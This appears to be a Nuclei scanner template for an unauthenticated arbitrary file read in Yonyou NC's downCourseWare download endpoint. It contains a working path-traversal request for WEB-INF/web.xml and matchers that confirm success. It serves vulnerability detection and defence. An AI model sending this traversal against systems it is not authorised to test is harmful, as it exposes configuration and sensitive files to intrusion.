id: yongyouNC-downCourseWare-File-reading

info:
  name: 用友NC downCourseWare 任意文件读取漏洞
  author: Superhero
  severity: medium
  description: |-
    app="用友-UFIDA-NC"
    用友NC 系统 /portal/pt/downCourseWare/download接囗的filename参数存在任意文件读取漏洞，未经身份认证的攻击者可以通过此漏洞获取敏感信息，使系统处于极不安全状态。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139511082
  tags: File reading

http:
  - raw:
      - |
        GET /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<?xml version='
          - '<web-app'
          - '</web-app>'
        condition: and
      - type: status
        status: 
          - 200